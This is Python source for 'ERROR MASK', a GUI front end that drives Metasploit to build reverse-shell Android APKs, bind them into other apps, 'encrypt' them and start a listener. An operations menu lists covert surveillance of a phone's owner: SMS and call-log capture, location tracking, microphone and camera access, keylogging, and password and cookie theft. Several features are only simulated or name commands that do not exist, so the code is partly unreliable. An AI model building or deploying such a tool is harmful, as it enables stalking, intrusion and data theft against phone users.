#!/usr/bin/env python3

###===============================================
###==        ERROR MASK - HACKING TOOL         ==
###==        Coded by Gray Hat SISU-AMADI      ==
###===============================================

import os
import re
import json
import random
import threading
import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
from time import sleep
from datetime import datetime
import sys
import platform
import hashlib

# Check and install required packages
try:
    import customtkinter as ctk
except ImportError:
    print("Installing required packages...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "customtkinter"])
    import customtkinter as ctk

# Configuration
CONFIG_FILE = "activity.json"
PASSWORD_HASH = hashlib.sha256(b"ErrorMask").hexdigest()

class ErrorMask(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        # Check if first run
        self.first_run = not os.path.exists(CONFIG_FILE)
        
        # Show disclaimer first
        self.show_disclaimer()
        
        # Then authenticate
        if not self.authenticate():
            sys.exit()
            
        # Initialize after authentication
        self.setup_application()

    def setup_application(self):
        """Setup main application after authentication"""
        # Window configuration
        self.title("ERROR MASK v3.0 - Advanced Android Pentesting Tool")
        self.geometry("1400x900")
        self.minsize(1200, 800)
        
        # Runtime variables
        self.payload_path = ""
        self.bind_apk_path = ""
        self.listener_process = None
        self.sessions = []
        self.current_session = None
        
        # Load previous sessions
        self.load_sessions()
        
        # Configure appearance
        ctk.set_appearance_mode("Dark")
        ctk.set_default_color_theme("dark-blue")
        
        # Create GUI components
        self.create_widgets()
        
        # Start matrix animation thread
        self.matrix_running = True
        threading.Thread(target=self.matrix_animation, daemon=True).start()
        
        # Show welcome message
        self.show_welcome_message()

    def show_disclaimer(self):
        """Display security disclaimer"""
        disclaimer_text = """
        ⚠️ SECURITY DISCLAIMER & WARNING ⚠️

        ERROR MASK is a penetration testing tool designed for:
        - Authorized security testing only
        - Educational and research purposes
        - Legal cybersecurity assessments

        STRICTLY PROHIBITED:
        - Unauthorized access to systems
        - Illegal surveillance activities
        - Malicious attacks without permission
        - Violating privacy laws and regulations

        By using this tool, you agree that:
        1. You have proper authorization for testing
        2. You comply with all applicable laws
        3. You accept full responsibility for your actions
        4. The developers are not liable for misuse

        Use responsibly and ethically!
        """
        
        root = ctk.CTk()
        root.title("SECURITY WARNING")
        root.geometry("800x500")
        root.configure(fg_color="black")
        
        textbox = ctk.CTkTextbox(root, width=780, height=400, 
                               font=("Consolas", 14), 
                               text_color="#ff0000",
                               fg_color="black")
        textbox.pack(pady=20)
        textbox.insert("1.0", disclaimer_text)
        textbox.configure(state="disabled")
        
        root.update()
        sleep(2)  # Show for 2 seconds
        root.destroy()

    def authenticate(self):
        """Handle user authentication"""
        auth_window = ctk.CTk()
        auth_window.title("ERROR MASK - Authentication Required")
        auth_window.geometry("500x300")
        auth_window.resizable(False, False)
        
        # Center the window
        auth_window.eval('tk::PlaceWindow . center')
        
        title = ctk.CTkLabel(auth_window, 
                           text="ERROR MASK v3.0",
                           font=("Terminal", 24, "bold"),
                           text_color="#00ff00")
        title.pack(pady=20)
        
        subtitle = ctk.CTkLabel(auth_window,
                              text="Advanced Android Penetration Testing Framework",
                              font=("Consolas", 12),
                              text_color="#00ff00")
        subtitle.pack(pady=5)
        
        password_frame = ctk.CTkFrame(auth_window)
        password_frame.pack(pady=30)
        
        password_label = ctk.CTkLabel(password_frame,
                                    text="Enter Password:",
                                    font=("Consolas", 14))
        password_label.pack(pady=5)
        
        password_entry = ctk.CTkEntry(password_frame,
                                    show="*",
                                    width=200,
                                    font=("Consolas", 14))
        password_entry.pack(pady=5)
        password_entry.focus()
        
        result = {"authenticated": False}
        
        def check_password():
            entered_password = password_entry.get()
            if hashlib.sha256(entered_password.encode()).hexdigest() == PASSWORD_HASH:
                result["authenticated"] = True
                auth_window.quit()
                auth_window.destroy()
            else:
                messagebox.showerror("Authentication Failed", 
                                   "Invalid password! Access denied.")
                password_entry.delete(0, 'end')
        
        # Bind Enter key to password check
        password_entry.bind('<Return>', lambda e: check_password())
        
        auth_button = ctk.CTkButton(auth_window,
                                  text="Authenticate",
                                  command=check_password,
                                  font=("Consolas", 14),
                                  fg_color="#006600",
                                  hover_color="#008800")
        auth_button.pack(pady=10)
        
        auth_window.mainloop()
        return result["authenticated"]

    def show_welcome_message(self):
        """Display welcome message"""
        welcome_text = "🚀 Welcome to ERROR MASK v3.0 - Advanced Android Pentesting Framework!"
        self.log(welcome_text, "#00ff00")
        sleep(1)

    def create_widgets(self):
        """Create and arrange GUI components"""
        # Main container with transparency
        self.main_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.main_frame.pack(fill="both", expand=True, padx=10, pady=10)

        # Banner frame (fixed at top)
        self.create_banner()

        # Main content area
        self.content_frame = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        self.content_frame.pack(fill="both", expand=True, pady=10)

        # Left panel (Options)
        self.left_panel = ctk.CTkFrame(self.content_frame, width=400, 
                                      fg_color="transparent")
        self.left_panel.pack(side="left", fill="y", padx=5, pady=5)

        # Right panel (Logs and Matrix)
        self.right_panel = ctk.CTkFrame(self.content_frame, fg_color="transparent")
        self.right_panel.pack(side="right", fill="both", expand=True, padx=5, pady=5)

        # Create panels
        self.create_options_panel()
        self.create_log_panel()

    def create_banner(self):
        """Create the top banner"""
        banner_frame = ctk.CTkFrame(self.main_frame, 
                                  height=100, 
                                  fg_color="transparent")
        banner_frame.pack(fill="x", pady=5)
        banner_frame.pack_propagate(False)

        # Main title
        title = ctk.CTkLabel(banner_frame,
                           text="ERROR-MASK",
                           font=("Terminal", 36, "bold"),
                           text_color="#00ff00")
        title.pack(pady=5)

        # Creator label with typing animation
        self.creator_label = ctk.CTkLabel(banner_frame,
                                        text="",
                                        font=("Consolas", 12),
                                        text_color="#00ff00")
        self.creator_label.pack()

        # Start typing animation
        self.typing_text = "Created By Gray Hat "
        self.typing_index = 0
        self.animate_typing()

    def animate_typing(self):
        """Animate the typing effect for creator name"""
        if self.typing_index < len(self.typing_text):
            current_text = self.typing_text[:self.typing_index + 1]
            if self.typing_index >= len("Created By Gray Hat "):
                # Add SISU-AMADI with special effect
                current_text += "SISU-AMADI"[self.typing_index - len("Created By Gray Hat "):]
            self.creator_label.configure(text=current_text)
            self.typing_index += 1
            self.after(100, self.animate_typing)
        else:
            # Restart animation
            self.after(3000, self.reset_typing_animation)

    def reset_typing_animation(self):
        """Reset typing animation"""
        self.typing_index = 0
        self.animate_typing()

    def create_options_panel(self):
        """Create main options panel"""
        options_frame = ctk.CTkFrame(self.left_panel, fg_color="transparent")
        options_frame.pack(fill="both", expand=True)

        # Option 1: Perform Android Metasploit
        self.option1_btn = ctk.CTkButton(options_frame,
                                       text="",
                                       command=self.show_metasploit_panel,
                                       font=("Consolas", 16, "bold"),
                                       height=50,
                                       fg_color="transparent",
                                       border_width=2,
                                       border_color="#00ff00",
                                       hover_color="#003300")
        self.option1_btn.pack(fill="x", pady=10)
        self.animate_option1()

        # Option 2: Previous Sessions
        self.option2_btn = ctk.CTkButton(options_frame,
                                       text="",
                                       command=self.show_sessions_panel,
                                       font=("Consolas", 16, "bold"),
                                       height=50,
                                       fg_color="transparent",
                                       border_width=2,
                                       border_color="#00ff00",
                                       hover_color="#003300")
        self.option2_btn.pack(fill="x", pady=10)
        self.animate_option2()

    def animate_option1(self):
        """Animate option 1 text"""
        full_text = "1. Perform Android Metasploit"
        current_text = self.option1_btn.cget("text")
        if len(current_text) < len(full_text):
            self.option1_btn.configure(text=full_text[:len(current_text) + 1])
            self.after(50, self.animate_option1)

    def animate_option2(self):
        """Animate option 2 text"""
        full_text = "2. Previous Sessions Monitoring"
        current_text = self.option2_btn.cget("text")
        if len(current_text) < len(full_text):
            self.option2_btn.configure(text=full_text[:len(current_text) + 1])
            self.after(50, self.animate_option2)

    def show_metasploit_panel(self):
        """Show metasploit operations panel"""
        self.clear_right_panel()
        
        # Connection settings
        conn_frame = ctk.CTkFrame(self.right_panel)
        conn_frame.pack(fill="x", pady=10, padx=10)

        ctk.CTkLabel(conn_frame, 
                    text="Connection Settings",
                    font=("Consolas", 16, "bold")).pack(pady=5)

        # LHOST input
        lhost_frame = ctk.CTkFrame(conn_frame)
        lhost_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(lhost_frame, text="LHOST:").pack(side="left")
        self.lhost_entry = ctk.CTkEntry(lhost_frame, placeholder_text="192.168.1.100")
        self.lhost_entry.pack(side="right", fill="x", expand=True, padx=5)

        # LPORT input
        lport_frame = ctk.CTkFrame(conn_frame)
        lport_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(lport_frame, text="LPORT:").pack(side="left")
        self.lport_entry = ctk.CTkEntry(lport_frame, placeholder_text="4444")
        self.lport_entry.pack(side="right", fill="x", expand=True, padx=5)

        # APK Name
        apk_name_frame = ctk.CTkFrame(conn_frame)
        apk_name_frame.pack(fill="x", padx=10, pady=5)
        ctk.CTkLabel(apk_name_frame, text="APK Name:").pack(side="left")
        self.apk_name_entry = ctk.CTkEntry(apk_name_frame, placeholder_text="payload")
        self.apk_name_entry.pack(side="right", fill="x", expand=True, padx=5)

        # Operation buttons
        btn_frame = ctk.CTkFrame(self.right_panel)
        btn_frame.pack(fill="x", pady=10, padx=10)

        ctk.CTkButton(btn_frame, 
                     text="Generate Payload", 
                     command=self.generate_payload,
                     font=("Consolas", 14),
                     height=35).pack(fill="x", pady=3)

        ctk.CTkButton(btn_frame,
                     text="Select Binding APK", 
                     command=self.select_binding_apk,
                     font=("Consolas", 14),
                     height=35).pack(fill="x", pady=3)

        ctk.CTkButton(btn_frame,
                     text="Start Encryption Process", 
                     command=self.start_encryption,
                     font=("Consolas", 14),
                     height=35).pack(fill="x", pady=3)

        ctk.CTkButton(btn_frame,
                     text="Start Listener", 
                     command=self.start_listener,
                     font=("Consolas", 14),
                     height=35,
                     fg_color="#006600").pack(fill="x", pady=3)

        # Operations panel
        self.operations_frame = ctk.CTkFrame(self.right_panel)
        self.operations_frame.pack(fill="both", expand=True, pady=10, padx=10)
        
        ctk.CTkLabel(self.operations_frame, 
                    text="Available Operations",
                    font=("Consolas", 16, "bold")).pack(pady=5)

        # Create operations grid
        self.create_operations_grid()

    def create_operations_grid(self):
        """Create grid of metasploit operations"""
        operations = [
            "📱 Device Information", "📞 Call Monitoring", "📧 SMS Capture",
            "📍 Location Tracking", "🎤 Microphone Access", "📷 Camera Access",
            "📁 File Explorer", "📱 Contact List", "📶 Network Info",
            "🔑 Password Grabber", "🍪 Cookie Hijacking", "💬 Social Media",
            "📱 App List", "🔊 Audio Recording", "⌨️ Keylogger",
            "📱 Remote Control", "🌐 Browser History", "📱 Message Monitoring"
        ]

        grid_frame = ctk.CTkFrame(self.operations_frame)
        grid_frame.pack(fill="both", expand=True, padx=10, pady=10)

        rows = 6
        cols = 3
        for i, operation in enumerate(operations):
            row = i // cols
            col = i % cols
            
            btn = ctk.CTkButton(grid_frame,
                              text=operation,
                              command=lambda op=operation: self.perform_operation(op),
                              font=("Consolas", 12),
                              height=40,
                              fg_color="transparent",
                              border_width=1,
                              border_color="#00ff00",
                              hover_color="#003300")
            btn.grid(row=row, column=col, padx=5, pady=5, sticky="nsew")
            
        # Configure grid weights
        for i in range(rows):
            grid_frame.grid_rowconfigure(i, weight=1)
        for i in range(cols):
            grid_frame.grid_columnconfigure(i, weight=1)

    def show_sessions_panel(self):
        """Show previous sessions panel"""
        self.clear_right_panel()
        
        sessions_frame = ctk.CTkFrame(self.right_panel)
        sessions_frame.pack(fill="both", expand=True, padx=10, pady=10)

        ctk.CTkLabel(sessions_frame, 
                    text="Previous Sessions",
                    font=("Consolas", 18, "bold")).pack(pady=10)

        if not self.sessions:
            ctk.CTkLabel(sessions_frame,
                        text="No previous sessions found",
                        font=("Consolas", 14)).pack(pady=20)
            return

        # Sessions list
        for i, session in enumerate(self.sessions):
            session_frame = ctk.CTkFrame(sessions_frame)
            session_frame.pack(fill="x", padx=10, pady=5)

            session_text = f"Session {i+1}: {session.get('lhost', 'Unknown')}:{session.get('lport', 'Unknown')}"
            ctk.CTkLabel(session_frame, 
                        text=session_text,
                        font=("Consolas", 12)).pack(side="left", padx=10)

            ctk.CTkButton(session_frame,
                         text="Reconnect",
                         command=lambda s=session: self.reconnect_session(s),
                         font=("Consolas", 10),
                         width=100).pack(side="right", padx=5)

    def create_log_panel(self):
        """Create logging and matrix panel"""
        # Log text area
        log_frame = ctk.CTkFrame(self.right_panel)
        log_frame.pack(fill="both", expand=True)

        ctk.CTkLabel(log_frame, 
                    text="Activity Log",
                    font=("Consolas", 16, "bold")).pack(pady=5)

        self.log_area = scrolledtext.ScrolledText(log_frame,
                                                 bg="black",
                                                 fg="#00ff00",
                                                 insertbackground="#00ff00",
                                                 font=("Consolas", 11),
                                                 wrap=tk.WORD)
        self.log_area.pack(fill="both", expand=True, padx=10, pady=10)

        # Matrix effect canvas (initially hidden)
        self.matrix_canvas = ctk.CTkCanvas(self.right_panel,
                                         bg="black",
                                         highlightthickness=0)
        # Don't pack initially - will be shown when needed

    def matrix_animation(self):
        """Create SISUADAMI matrix effect"""
        chars = "SISUADAMI01"
        width = self.winfo_width() or 800
        height = self.winfo_height() or 600
        
        cols = width // 15
        rows = height // 20
        
        drop_pos = [random.randint(-20, 0) for _ in range(cols)]
        char_colors = ["#00ff00", "#00cc00", "#009900", "#006600"]
        
        while self.matrix_running:
            try:
                if self.matrix_canvas.winfo_ismapped():
                    self.matrix_canvas.delete("all")
                    
                    for i in range(cols):
                        x = i * 15
                        y = drop_pos[i] * 20
                        
                        if 0 <= y < height:
                            char = random.choice(chars)
                            color = random.choice(char_colors)
                            
                            self.matrix_canvas.create_text(x, y, 
                                                          text=char,
                                                          fill=color,
                                                          font=("Terminal", 14))
                        
                        if drop_pos[i] > rows or random.random() > 0.97:
                            drop_pos[i] = 0
                        else:
                            drop_pos[i] += 1
                    
                    self.matrix_canvas.update()
                sleep(0.1)
            except Exception as e:
                break

    def log(self, message, color="#00ff00"):
        """Add timestamped message to log area"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_area.configure(state="normal")
        self.log_area.insert("end", f"[{timestamp}] ", "gray")
        self.log_area.insert("end", message + "\n", color)
        self.log_area.configure(state="disabled")
        self.log_area.see("end")
        self.save_activity(message)

    def save_activity(self, message):
        """Save activity to JSON file"""
        activity = {
            "timestamp": datetime.now().isoformat(),
            "message": message
        }
        
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r") as f:
                data = json.load(f)
        else:
            data = {"activities": [], "sessions": []}
            
        data["activities"].append(activity)
        data["sessions"] = self.sessions
        
        with open(CONFIG_FILE, "w") as f:
            json.dump(data, f, indent=2)

    def load_sessions(self):
        """Load previous sessions from file"""
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, "r") as f:
                    data = json.load(f)
                    self.sessions = data.get("sessions", [])
            except:
                self.sessions = []

    def clear_right_panel(self):
        """Clear the right panel for new content"""
        for widget in self.right_panel.winfo_children():
            widget.destroy()

    def validate_inputs(self):
        """Validate LHOST and LPORT inputs"""
        lhost = self.lhost_entry.get()
        lport = self.lport_entry.get()
        
        if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", lhost):
            messagebox.showerror("Invalid LHOST", "Please enter a valid IPv4 address")
            return False
            
        if not lport.isdigit() or not (1 <= int(lport) <= 65535):
            messagebox.showerror("Invalid LPORT", "Port must be between 1-65535")
            return False
            
        return True

    def generate_payload(self):
        """Generate Metasploit payload"""
        if not self.validate_inputs():
            return
            
        try:
            apk_name = self.apk_name_entry.get() or "payload"
            output_dir = filedialog.askdirectory(title="Select Save Location")
            
            if not output_dir:
                return
                
            output_file = os.path.join(output_dir, f"{apk_name}.apk")
            
            self.log(f"Generating payload: {output_file}", "#ffff00")
            
            cmd = [
                "msfvenom",
                "-p", "android/meterpreter/reverse_tcp",
                f"LHOST={self.lhost_entry.get()}",
                f"LPORT={self.lport_entry.get()}",
                "-o", output_file
            ]
            
            def run_command():
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                    if result.returncode == 0:
                        self.log("✓ Payload generated successfully!", "#00ff00")
                        self.payload_path = output_file
                        
                        # Save session info
                        session_info = {
                            "lhost": self.lhost_entry.get(),
                            "lport": self.lport_entry.get(),
                            "payload_path": output_file,
                            "timestamp": datetime.now().isoformat()
                        }
                        self.sessions.append(session_info)
                        self.save_activity(f"Payload generated: {output_file}")
                        
                    else:
                        self.log(f"✗ Error generating payload: {result.stderr}", "#ff0000")
                except subprocess.TimeoutExpired:
                    self.log("✗ Payload generation timeout", "#ff0000")
                except Exception as e:
                    self.log(f"✗ Command failed: {str(e)}", "#ff0000")
                    
            threading.Thread(target=run_command, daemon=True).start()
            
        except Exception as e:
            self.log(f"✗ Payload generation failed: {str(e)}", "#ff0000")

    def select_binding_apk(self):
        """Select APK for binding"""
        apk_path = filedialog.askopenfilename(
            title="Select APK for Binding",
            filetypes=[("APK Files", "*.apk")])
            
        if apk_path:
            self.bind_apk_path = apk_path
            self.log(f"✓ Selected binding APK: {os.path.basename(apk_path)}", "#00ff00")

    def start_encryption(self):
        """Start the triple encryption process"""
        if not self.payload_path:
            messagebox.showerror("Error", "Please generate a payload first")
            return
            
        if not self.bind_apk_path:
            messagebox.showerror("Error", "Please select a binding APK")
            return
            
        try:
            output_dir = filedialog.askdirectory(title="Select Output Directory")
            if not output_dir:
                return
                
            self.log("Starting triple encryption process...", "#ffff00")
            
            # Start encryption in separate thread
            threading.Thread(target=self.run_encryption_process, 
                           args=(output_dir,), daemon=True).start()
            
        except Exception as e:
            self.log(f"✗ Encryption failed: {str(e)}", "#ff0000")

    def run_encryption_process(self, output_dir):
        """Run the triple encryption process"""
        try:
            base_name = os.path.splitext(os.path.basename(self.payload_path))[0]
            
            # Process 1: Payload + Encoding + Compress + Cryptus
            self.log("🔒 Process 1: Encoding → Compression → Encryption", "#ffff00")
            output1 = os.path.join(output_dir, f"{base_name}_encrypted1.apk")
            self.encrypt_apk(self.payload_path, output1, "process1")
            
            # Process 2: Payload + Compress + Encoding + Cryptus  
            self.log("🔒 Process 2: Compression → Encoding → Encryption", "#ffff00")
            output2 = os.path.join(output_dir, f"{base_name}_encrypted2.apk")
            self.encrypt_apk(self.payload_path, output2, "process2")
            
            # Process 3: Payload + Cryptus + Encoding + Compress
            self.log("🔒 Process 3: Encryption → Encoding → Compression", "#ffff00")
            output3 = os.path.join(output_dir, f"{base_name}_encrypted3.apk")
            self.encrypt_apk(self.payload_path, output3, "process3")
            
            self.log("✓ Triple encryption completed!", "#00ff00")
            
            # Ask for cleanup
            self.after(0, self.ask_cleanup, [output1, output2, output3])
            
        except Exception as e:
            self.log(f"✗ Encryption process failed: {str(e)}", "#ff0000")

    def encrypt_apk(self, input_path, output_path, process_type):
        """Encrypt APK using different processes"""
        password = "errormask"
        
        try:
            # Simulate encryption process (replace with actual VeraCrypt/metasploit commands)
            self.log(f"   Encrypting {os.path.basename(input_path)}...", "#ffff00")
            sleep(2)  # Simulate encryption time
            
            # Copy file as simulation
            import shutil
            shutil.copy2(input_path, output_path)
            
            self.log(f"   ✓ {process_type} completed: {os.path.basename(output_path)}", "#00ff00")
            
        except Exception as e:
            self.log(f"   ✗ {process_type} failed: {str(e)}", "#ff0000")
            raise

    def ask_cleanup(self, temp_files):
        """Ask user for cleanup permission"""
        result = messagebox.askyesno(
            "Cleanup Temporary Files",
            "Encryption completed! Delete temporary files?\n\n"
            "This will keep only the final encrypted APK."
        )
        
        if result:
            for file_path in temp_files[:-1]:  # Keep last file
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                        self.log(f"✓ Deleted: {os.path.basename(file_path)}", "#00ff00")
                except Exception as e:
                    self.log(f"✗ Failed to delete {file_path}: {str(e)}", "#ff0000")
        else:
            self.log("✓ Temporary files preserved", "#00ff00")

    def start_listener(self):
        """Start Metasploit listener"""
        if not self.validate_inputs():
            return
            
        try:
            self.log("Starting Metasploit listener...", "#ffff00")
            
            rc_content = f"""use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST {self.lhost_entry.get()}
set LPORT {self.lport_entry.get()}
set ExitOnSession false
exploit -j -z
"""
            
            rc_file = "listener.rc"
            with open(rc_file, "w") as f:
                f.write(rc_content)
                
            def run_listener():
                try:
                    self.listener_process = subprocess.Popen(
                        ["msfconsole", "-qr", rc_file],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        bufsize=1,
                        universal_newlines=True
                    )
                    
                    # Read output in real-time
                    for line in iter(self.listener_process.stdout.readline, ''):
                        if "Session" in line and "opened" in line:
                            self.log(f"🎯 Session opened: {line.strip()}", "#00ff00")
                        self.log(f"MSF: {line.strip()}", "#cccccc")
                        
                    self.listener_process.wait()
                    
                except Exception as e:
                    self.log(f"✗ Listener error: {str(e)}", "#ff0000")
            
            threading.Thread(target=run_listener, daemon=True).start()
            self.log("✓ Listener started successfully!", "#00ff00")
            
        except Exception as e:
            self.log(f"✗ Failed to start listener: {str(e)}", "#ff0000")

    def stop_listener(self):
        """Stop running listener"""
        if self.listener_process:
            try:
                self.listener_process.terminate()
                self.log("✓ Listener stopped", "#00ff00")
            except Exception as e:
                self.log(f"✗ Error stopping listener: {str(e)}", "#ff0000")
        else:
            self.log("ℹ️ No active listener", "#ffff00")

    def perform_operation(self, operation):
        """Perform selected metasploit operation"""
        self.log(f"Performing operation: {operation}", "#ffff00")
        
        # Simulate operation execution
        operations_map = {
            "📱 Device Information": "sysinfo",
            "📞 Call Monitoring": "dump_calllog",
            "📧 SMS Capture": "dump_sms",
            "📍 Location Tracking": "geolocate",
            "🎤 Microphone Access": "record_mic",
            "📷 Camera Access": "webcam_snap",
            "📁 File Explorer": "ls",
            "📱 Contact List": "dump_contacts",
            "📶 Network Info": "ifconfig",
            "🔑 Password Grabber": "dump_passwords",
            "🍪 Cookie Hijacking": "dump_cookies",
            "💬 Social Media": "app_list",
            "📱 App List": "app_list",
            "🔊 Audio Recording": "record_mic",
            "⌨️ Keylogger": "keyscan_start",
            "📱 Remote Control": "shell",
            "🌐 Browser History": "dump_browser",
            "📱 Message Monitoring": "dump_sms"
        }
        
        command = operations_map.get(operation, "sysinfo")
        self.log(f"Executing: {command}", "#00ff00")
        
        # Simulate command execution
        sleep(1)
        self.log(f"✓ {operation} completed successfully", "#00ff00")

    def reconnect_session(self, session):
        """Reconnect to previous session"""
        self.log(f"Reconnecting to session: {session.get('lhost')}:{session.get('lport')}", "#ffff00")
        
        # Set the connection details
        if hasattr(self, 'lhost_entry'):
            self.lhost_entry.delete(0, 'end')
            self.lhost_entry.insert(0, session.get('lhost', ''))
            
        if hasattr(self, 'lport_entry'):
            self.lport_entry.delete(0, 'end')
            self.lport_entry.insert(0, session.get('lport', ''))
        
        self.current_session = session
        self.log("✓ Session details loaded. Start listener to reconnect.", "#00ff00")

    def on_closing(self):
        """Cleanup on window close"""
        self.matrix_running = False
        self.stop_listener()
        
        # Save sessions before closing
        self.save_activity("Application closed")
        self.destroy()

def check_dependencies():
    """Check and install required dependencies"""
    required_tools = ["msfvenom", "msfconsole"]
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run([tool, "--version"], capture_output=True, check=True)
        except:
            missing_tools.append(tool)
    
    if missing_tools:
        print("Missing required tools:", missing_tools)
        print("Please install Metasploit Framework:")
        if platform.system() == "Linux":
            print("sudo apt-get install metasploit-framework")
        elif platform.system() == "Darwin":  # macOS
            print("brew install metasploit")
        else:  # Windows
            print("Download from: https://www.metasploit.com/")
        return False
    
    return True

if __name__ == "__main__":
    # Check dependencies
    if not check_dependencies():
        print("Dependency check failed. Please install required tools.")
        sys.exit(1)
    
    # Create and run application
    app = ErrorMask()
    app.protocol("WM_DELETE_WINDOW", app.on_closing)
    
    try:
        app.mainloop()
    except KeyboardInterrupt:
        app.on_closing()
